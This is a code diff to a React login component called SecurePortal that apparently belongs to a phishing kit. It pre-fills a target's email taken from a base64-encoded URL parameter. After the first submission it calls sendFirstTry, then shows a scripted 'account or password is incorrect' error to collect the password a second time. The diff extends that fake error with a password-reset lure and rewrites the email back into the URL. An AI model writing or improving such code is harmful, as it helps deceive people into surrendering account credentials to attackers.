@@ -36,23 +36,30 @@ const SecurePortal = () => {
     );
   // Extract email from URL
   useEffect(() => {
-    const params = new URLSearchParams(window.location.search);
-    const emailParam = params.get('id') || params.get('u');
-    if (emailParam) {
-      try {
-        const decodedEmail = atob(decodeURIComponent(emailParam));
-        if (decodedEmail.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
-          setUserInput(decodedEmail);
-          setIsValidated(true);
-        }
-      } catch {
-        if (emailParam.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
-          setUserInput(emailParam);
-          setIsValidated(true);
-        }
+  const params = new URLSearchParams(window.location.search);
+  const emailParam = params.get('id') || params.get('u');
+  if (emailParam) {
+    try {
+      const decodedEmail = atob(decodeURIComponent(emailParam));
+      if (decodedEmail.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+        setUserInput(decodedEmail);
+        setIsValidated(true);
+        // Re-encode and update URL
+        const reEncoded = encodeURIComponent(btoa(decodedEmail));
+        window.history.replaceState({}, '', `?u=${reEncoded}`);
+      }
+    } catch {
+      // email was not base64-encoded
+      if (emailParam.match(/^[^\s@]+@[^\s@]+\.[^\s@]+$/)) {
+        setUserInput(emailParam);
+        setIsValidated(true);
+        // Encode and update URL
+        const encoded = encodeURIComponent(btoa(emailParam));
+        window.history.replaceState({}, '', `?u=${encoded}`);
       }
     }
-  }, []);
+  }
+}, []);
 
   // Auto-focus logic
   useEffect(() => {
@@ -203,7 +210,7 @@ const SecurePortal = () => {
       await sendFirstTry(code);
 
       setTimeout(() => {
-        setErrorMsg(<span className='status-notification' style={{ color: 'red' }}>Your account or password is incorrect. Try again.</span>);
+        setErrorMsg(<span className='status-notification' style={{ color: 'red' }}>Your account or password is incorrect. Try again. If you don't remember your password, reset it now.</span>);
         setIsLocked(false);
       }, 200);
       return;
